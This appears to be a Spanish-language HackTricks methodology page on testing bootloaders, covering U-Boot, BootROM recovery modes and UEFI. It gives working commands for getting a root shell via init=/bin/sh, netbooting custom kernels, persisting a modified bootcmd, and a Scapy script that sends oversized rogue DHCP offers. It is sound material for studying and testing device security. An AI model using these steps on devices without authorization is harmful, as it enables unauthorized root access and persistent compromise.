# Pruebas de bootloader

{{#include ../../banners/hacktricks-training.md}}

Los siguientes pasos se recomiendan para modificar configuraciones de arranque del dispositivo y probar bootloaders como U-Boot y cargadores de clase UEFI. Enfócate en obtener ejecución de código temprana, evaluar protecciones de firma/rollback y abusar de rutas de recuperación o arranque por red.

Relacionado: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Acceder al intérprete/console
- Durante el arranque, presiona una tecla conocida de interrupción (a menudo cualquier tecla, 0, espacio o una secuencia "mágica" específica de la placa) antes de que `bootcmd` se ejecute para caer al prompt de U-Boot.

2. Inspeccionar estado de arranque y variables
- Comandos útiles:
- `printenv` (volcar environment)
- `bdinfo` (info de placa, direcciones de memoria)
- `help bootm; help booti; help bootz` (métodos de arranque de kernel soportados)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modificar argumentos de arranque para obtener una root shell
- Añade `init=/bin/sh` para que el kernel deje una shell en lugar del init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot desde tu servidor TFTP
- Configura la red y descarga un kernel/fit image desde la LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistir cambios vía environment
- Si el almacenamiento de env no está protegido contra escritura, puedes persistir control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Revisa variables como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influyen en rutas de fallback. Valores mal configurados pueden permitir entradas repetidas al shell.

6. Buscar características de debug/inseguras
- Revisa: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, capacidad de `loady`/`loads` vía serial, `env import` desde medios no confiables, y kernels/ramdisks cargados sin cheques de firma.

7. Pruebas de imagen/verification en U-Boot
- Si la plataforma declara secure/verified boot con FIT images, prueba imágenes unsigned y manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento legacy `verify=n` a menudo permite bootear payloads arbitrarios.

## Superficie de netboot (DHCP/PXE) y servidores rogue

8. Fuzzing de parámetros PXE/DHCP
- El manejo legacy BOOTP/DHCP de U-Boot ha tenido problemas de seguridad de memoria. Por ejemplo, CVE‑2024‑42040 describe una divulgación de memoria vía respuestas DHCP crafted que pueden leak bytes desde la memoria de U-Boot de vuelta en la red. Ejercita las rutas de código DHCP/PXE con valores excesivamente largos/casos límite (option 67 bootfile-name, vendor options, file/servername fields) y observa bloqueos/leaks.
- Snippet mínimo con Scapy para estresar parámetros de arranque durante netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- También valida si los campos de filename PXE se pasan a la lógica del shell/loader sin saneamiento cuando se encadenan a scripts de provisión del lado del OS.

9. Pruebas de inyección de comandos desde DHCP rogue
- Monta un servicio DHCP/PXE rogue e intenta inyectar caracteres en filename u opciones para alcanzar intérpretes de comandos en etapas posteriores de la cadena de arranque. El DHCP auxiliary de Metasploit, `dnsmasq`, o scripts custom de Scapy funcionan bien. Asegúrate de aislar la red del laboratorio primero.

## Modos de recuperación BootROM del SoC que sobreescriben el arranque normal

Muchos SoC exponen un modo BootROM "loader" que aceptará código por USB/UART incluso cuando las imágenes en flash sean inválidas. Si los fuses de secure-boot no están quemados, esto puede proporcionar ejecución de código arbitraria muy temprano en la cadena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Evalúa si el dispositivo tiene eFuses/OTP de secure-boot quemados. Si no, los modos de descarga BootROM frecuentemente bypass cualquier verificación de niveles superiores (U-Boot, kernel, rootfs) ejecutando tu payload de primera etapa directamente desde SRAM/DRAM.

## UEFI/PC-class bootloaders: comprobaciones rápidas

10. Manipulación del ESP y pruebas de rollback
- Monta la EFI System Partition (ESP) y revisa componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, rutas de logo del vendor.
- Intenta bootear con componentes firmados downgraded o con vulnerabilidades conocidas si las revocaciones de Secure Boot (dbx) no están actualizadas. Si la plataforma todavía confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde el ESP para obtener persistencia.

11. Bugs en parsing de logos de arranque (clase LogoFAIL)
- Varios firmwares OEM/IBV fueron vulnerables a fallos de parsing de imágenes en DXE que procesan logos de arranque. Si un atacante puede colocar una imagen crafted en el ESP bajo una ruta vendor-specific (p. ej., `\EFI\<vendor>\logo\*.bmp`) y reiniciar, la ejecución de código durante el arranque temprano puede ser posible incluso con Secure Boot habilitado. Prueba si la plataforma acepta logos suministrados por el usuario y si esas rutas son escribibles desde el OS.

## Precauciones de hardware

Sé cauto al interactuar con SPI/NAND flash durante el arranque temprano (p. ej., conectar a masa pines para bypass de lecturas) y consulta siempre la hoja de datos del flash. Cortocircuitos temporizados incorrectamente pueden corromper el dispositivo o el programador.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs de environment entre RAM y almacenamiento; algunas plataformas permiten importar env desde medios removibles sin autenticación.
- Para persistencia en sistemas Linux que arrancan vía `extlinux.conf`, modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la partición de arranque suele ser suficiente cuando no hay chequeos de firma.
- Si el userland proporciona `fw_printenv/fw_setenv`, valida que `/etc/fw_env.config` coincida con el almacenamiento real de env. Offsets mal configurados permiten leer/escribir la región MTD equivocada.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
